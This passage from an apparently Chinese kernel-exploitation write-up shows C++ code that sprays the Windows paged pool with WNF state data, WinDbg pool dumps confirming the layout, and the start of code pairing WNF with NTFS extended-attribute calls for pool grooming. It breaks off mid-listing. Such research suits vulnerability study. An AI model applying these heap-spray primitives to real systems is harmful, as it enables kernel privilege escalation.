class="params"><span class="function">    _In_opt_ PCWNF_TYPE_ID TypeId, <span class="comment">// This is an optional way to get type-safety</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ ULONG MaximumStateSize,<span class="comment">// Cannot be above 4KB</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor<span class="comment">// *MUST* be present</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwUpdateWnfStateData)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PCWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_opt_(Length) <span class="type">const</span> VOID* Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ ULONG Length, <span class="comment">// Must be less than MaximumSizewhen registered </span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PCWNF_TYPE_ID TypeId, <span class="comment">// Optionally, for type-safety</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ <span class="type">const</span> PVOID ExplicitScope,<span class="comment">// Process handle, User SID, Session ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,<span class="comment">// Expected current change stamp</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LOGICAL CheckStamp<span class="comment">// Enforce the above or silently ignore it</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PZwCreateWnfStateName ZwCreateWnfStateName = (PZwCreateWnfStateName)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwCreateWnfStateName&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwCreateWnfStateName) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to get ZwCreateWnfStateName : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PZwUpdateWnfStateData ZwUpdateWnfStateData = (PZwUpdateWnfStateData)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwUpdateWnfStateData&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwUpdateWnfStateData) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to get ZwUpdateWnfStateData : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WNF_STATE_NAME state;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;state, <span class="number">0</span>, <span class="built_in">sizeof</span>(state));</span><br><span class="line"></span><br><span class="line">    SECURITY_DESCRIPTOR sd;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;sd, <span class="number">0</span>, <span class="built_in">sizeof</span>(sd));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">InitializeSecurityDescriptor</span>(&amp;sd, SECURITY_DESCRIPTOR_REVISION)) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to InitializeSecurityDescriptor : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwCreateWnfStateName</span>(&amp;state, WnfTemporaryStateName, WnfDataScopeUser, FALSE, <span class="number">0</span>, <span class="number">0x1000</span>, &amp;sd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to ZwCreateWnfStateName: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> ULONG allocSize = <span class="number">0x100</span>;</span><br><span class="line">    <span class="type">char</span> buffer[allocSize] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0x66</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">    </span><br><span class="line">    status = <span class="built_in">ZwUpdateWnfStateData</span>(&amp;state, buffer, <span class="built_in">sizeof</span>(buffer), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;failed to ZwUpdateWnfStateData: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;done!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用如下断点：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp nt!ExpWnfWriteStateData <span class="string">&quot;j @r8 = 0x100 &#x27;&#x27;;&#x27;gc&#x27;&quot;</span></span><br><span class="line">bp nt!ExAllocatePoolWithQuotaTag <span class="string">&quot;j @r8 = 0x20666E57 &#x27;&#x27;;&#x27;gc&#x27;&quot;</span></span><br></pre></td></tr></table></figure>

<p>得到如下结果：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !pool ffff9f0847d46750</span><br><span class="line">Pool page ffff9f0847d46750 region is Paged pool</span><br><span class="line"> ffff9f0847d46000 size:  <span class="number">1</span>a0 previous size:    <span class="number">0</span>  (Free)       ....</span><br><span class="line"> ffff9f0847d461a0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  NtFs</span><br><span class="line"> ffff9f0847d462c0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  IoNm</span><br><span class="line"> ffff9f0847d463e0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  VM3D</span><br><span class="line"> ffff9f0847d46500 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  IoNm</span><br><span class="line"> ffff9f0847d46620 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  NtFs</span><br><span class="line">*ffff9f0847d46740 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated) *Wnf  Process: ffffc58e02014080</span><br><span class="line">		Pooltag Wnf  : Windows Notification Facility, Binary : nt!wnf</span><br><span class="line"> ffff9f0847d46860 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  IoNm</span><br><span class="line"> ffff9f0847d46980 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  IoNm</span><br><span class="line"> ffff9f0847d46aa0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  IoNm</span><br><span class="line"> ffff9f0847d46bc0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  NtFs</span><br><span class="line"> ffff9f0847d46ce0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  NtFs</span><br><span class="line"> ffff9f0847d46e00 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  NtFs</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dc ffff9f0847d46750<span class="number">-0x10</span></span><br><span class="line">ffff9f08`<span class="number">47</span>d46740  <span class="number">0b1</span>20000 <span class="number">20666e57</span> <span class="number">1b</span>572cab <span class="number">19684</span>ad3  ....Wnf .,W..Jh.</span><br><span class="line">ffff9f08`<span class="number">47</span>d46750  <span class="number">00100904</span> <span class="number">00000100</span> <span class="number">00000100</span> <span class="number">00000001</span>  ................</span><br><span class="line">ffff9f08`<span class="number">47</span>d46760  <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span>  ffffffffffffffff</span><br><span class="line">ffff9f08`<span class="number">47</span>d46770  <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span>  ffffffffffffffff</span><br><span class="line">ffff9f08`<span class="number">47</span>d46780  <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span>  ffffffffffffffff</span><br><span class="line">ffff9f08`<span class="number">47</span>d46790  <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span>  ffffffffffffffff</span><br><span class="line">ffff9f08`<span class="number">47</span>d467a0  <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span>  ffffffffffffffff</span><br><span class="line">ffff9f08`<span class="number">47</span>d467b0  <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span> <span class="number">66666666</span>  ffffffffffffffff</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dt nt!_POOL_HEADER ffff9f0847d46750<span class="number">-0x10</span></span><br><span class="line">   +<span class="number">0x000</span> PreviousSize     : <span class="number">0</span>y00000000 (<span class="number">0</span>)</span><br><span class="line">   +<span class="number">0x000</span> PoolIndex        : <span class="number">0</span>y00000000 (<span class="number">0</span>)</span><br><span class="line">   +<span class="number">0x002</span> BlockSize        : <span class="number">0</span>y00010010 (<span class="number">0x12</span>)</span><br><span class="line">   +<span class="number">0x002</span> PoolType         : <span class="number">0</span>y00001011 (<span class="number">0xb</span>)</span><br><span class="line">   +<span class="number">0x000</span> Ulong1           : <span class="number">0xb120000</span></span><br><span class="line">   +<span class="number">0x004</span> PoolTag          : <span class="number">0x20666e57</span></span><br><span class="line">   +<span class="number">0x008</span> ProcessBilled    : <span class="number">0x19684ad3</span>`<span class="number">1b</span>572cab _EPROCESS</span><br><span class="line">   +<span class="number">0x008</span> AllocatorBackTraceIndex : <span class="number">0x2cab</span></span><br><span class="line">   +<span class="number">0x00a</span> PoolTagHash      : <span class="number">0x1b57</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dt nt!_WNF_STATE_DATA ffff9f0847d46750</span><br><span class="line">   +<span class="number">0x000</span> Header           : _WNF_NODE_HEADER</span><br><span class="line">   +<span class="number">0x004</span> AllocatedSize    : <span class="number">0x100</span></span><br><span class="line">   +<span class="number">0x008</span> DataSize         : <span class="number">0x100</span></span><br><span class="line">   +<span class="number">0x00c</span> ChangeStamp      : <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><code>PoolType</code> 中的比特位从高到低分别代表：</p>
<ul>
<li>PoolQuota &#x3D; 8</li>
<li>NonPagedPoolMustSucceed &#x3D; 2</li>
<li>PagedPool &#x3D; 1</li>
</ul>
<p>分配的块与我们所设想的一致，随后我们尝试使用不同的 <code>TypeId</code> 来进行堆喷：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; !pool @rax</span><br><span class="line">Pool page ffff9f084f8a1ad0 region is Paged pool</span><br><span class="line"> ffff9f084f8a10a0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58dffb6e080</span><br><span class="line"> ffff9f084f8a11c0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58dffb6e080</span><br><span class="line"> ffff9f084f8a12e0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58dffb6e080</span><br><span class="line"> ffff9f084f8a1400 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58dffb6e080</span><br><span class="line"> ffff9f084f8a1520 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated)  Wnf  Process: ffffc58dffb6e080</span><br><span class="line"> ffff9f084f8a1640 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Free)       ....</span><br><span class="line"> ffff9f084f8a1760 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Free)       ....</span><br><span class="line"> ffff9f084f8a1880 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Free)       ....</span><br><span class="line"> ffff9f084f8a19a0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Free)       ....</span><br><span class="line">*ffff9f084f8a1ac0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Allocated) *Wnf  Process: ffffc58dffb6e080</span><br><span class="line">		Pooltag Wnf  : Windows Notification Facility, Binary : nt!wnf</span><br><span class="line"> ffff9f084f8a1be0 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Free)       ....</span><br><span class="line"> ffff9f084f8a1d00 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Free)       ....</span><br><span class="line"> ffff9f084f8a1e20 size:  <span class="number">120</span> previous size:    <span class="number">0</span>  (Free)       ....</span><br></pre></td></tr></table></figure>

<p>可以发现基本上已经喷到接下来可控的地步了，尝试释放其中一个 <code>WNF</code> 的块并用 <code>NtFE</code> 占据，代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_STATUS_BLOCK</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        LONG Status;</span><br><span class="line">        PVOID Pointer;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG Information;</span><br><span class="line">&#125; IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_FULL_EA_INFORMATION</span> &#123;</span><br><span class="line">    ULONG  NextEntryOffset;</span><br><span class="line">    UCHAR  Flags;</span><br><span class="line">    UCHAR  EaNameLength;</span><br><span class="line">    USHORT EaValueLength;</span><br><span class="line">    CHAR   EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_GET_EA_INFORMATION</span> &#123;</span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    UCHAR EaNameLength;</span><br><span class="line">    CHAR  EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_GET_EA_INFORMATION, * PFILE_GET_EA_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwSetEaFile)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN HANDLE FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG Length</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwQueryEaFile)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN HANDLE FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN BOOLEAN ReturnSingleEntry,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID EaList,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG EaListLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PULONG EaIndex,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN BOOLEAN RestartScan</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WNF_STATE_NAME</span> &#123;</span><br><span class="line">    ULONG Data[<span class="number">2</span>];</span><br><span class="line">&#125; WNF_STATE_NAME, * PWNF_STATE_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> WNF_STATE_NAME* PCWNF_STATE_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_WNF_STATE_NAME_LIFETIME</span> &#123;</span><br><span class="line">    WnfWellKnownStateName,</span><br><span class="line">    WnfPermanentStateName,</span><br><span class="line">    WnfPersistentStateName,</span><br><span class="line">    WnfTemporaryStateName</span><br><span class="line">&#125; WNF_STATE_NAME_LIFETIME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_WNF_STATE_NAME_INFORMATION</span> &#123;</span><br><span class="line">    WnfInfoStateNameExist,</span><br><span class="line">    WnfInfoSubscribersPresent,</span><br><span class="line">    WnfInfoIsQuiescent</span><br><span class="line">&#125; WNF_STATE_NAME_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_WNF_DATA_SCOPE</span> &#123;</span><br><span class="line">    WnfDataScopeSystem,</span><br><span class="line">    WnfDataScopeSession,</span><br><span class="line">    WnfDataScopeUser,</span><br><span class="line">    WnfDataScopeProcess</span><br><span class="line">&#125; WNF_DATA_SCOPE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WNF_TYPE_ID</span> &#123;</span><br><span class="line">    GUID TypeId;</span><br><span class="line">&#125; WNF_TYPE_ID, * PWNF_TYPE_ID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> WNF_TYPE_ID* PCWNF_TYPE_ID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> ULONG WNF_CHANGE_STAMP, * PWNF_CHANGE_STAMP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> ULONG LOGICAL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwCreateWnfStateName)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WNF_STATE_NAME_LIFETIME NameLifetime,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WNF_DATA_SCOPE DataScope,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOLEAN PersistData,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PCWNF_TYPE_ID TypeId, <span class="comment">// This is an optional way to get type-safety</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ ULONG MaximumStateSize,<span class="comment">// Cannot be above 4KB</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor<span class="comment">// *MUST* be present</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwUpdateWnfStateData)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PCWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_opt_(Length) <span class="type">const</span> VOID* Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ ULONG Length, <span class="comment">// Must be less than MaximumSizewhen registered </span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PCWNF_TYPE_ID TypeId, <span class="comment">// Optionally, for type-safety</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ <span class="type">const</span> PVOID ExplicitScope,<span class="comment">// Process handle, User SID, Session ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,<span class="comment">// Expected current change stamp</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LOGICAL CheckStamp<span class="comment">// Enforce the above or silently ignore it</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwDeleteWnfStateData)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PCWNF_STATE_NAME StateName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ <span class="type">const</span> VOID* ExplicitScope</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span 